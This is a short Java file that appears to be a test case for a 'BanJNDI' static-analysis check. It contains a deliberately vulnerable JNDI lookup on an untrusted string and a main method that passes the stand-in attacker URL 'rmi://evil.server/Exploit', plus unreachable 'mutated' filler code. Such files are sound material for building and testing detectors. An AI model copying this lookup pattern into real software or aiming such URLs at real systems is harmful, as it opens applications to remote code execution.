import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    private boolean getFalseCondition() {
        return false; // This method always returns false
    }

    public String showBug(String jndiUrl) throws NamingException {
        Context ctx = new InitialContext();
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI

        // Mutated code: Unreachable switch statement
        boolean condition = getFalseCondition();
        if (condition) {
            int value = 0;
            switch (value) {
                case 1:
                    System.out.println("This line will never be reached");
                    break;
            }
        }

        return object.toString();
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}